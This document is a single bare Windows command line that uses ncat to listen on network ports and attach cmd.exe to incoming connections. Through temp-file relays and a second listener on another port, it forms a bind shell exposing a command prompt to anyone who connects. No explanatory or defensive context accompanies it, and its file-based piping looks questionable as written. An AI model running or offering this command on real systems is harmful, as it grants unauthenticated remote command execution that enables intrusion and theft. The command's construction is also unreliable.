ncat.exe -l -p 12345 -c "cmd.exe < %TEMP%\pipe_in | ncat.exe -l -p 12346 > %TEMP%\pipe_out"
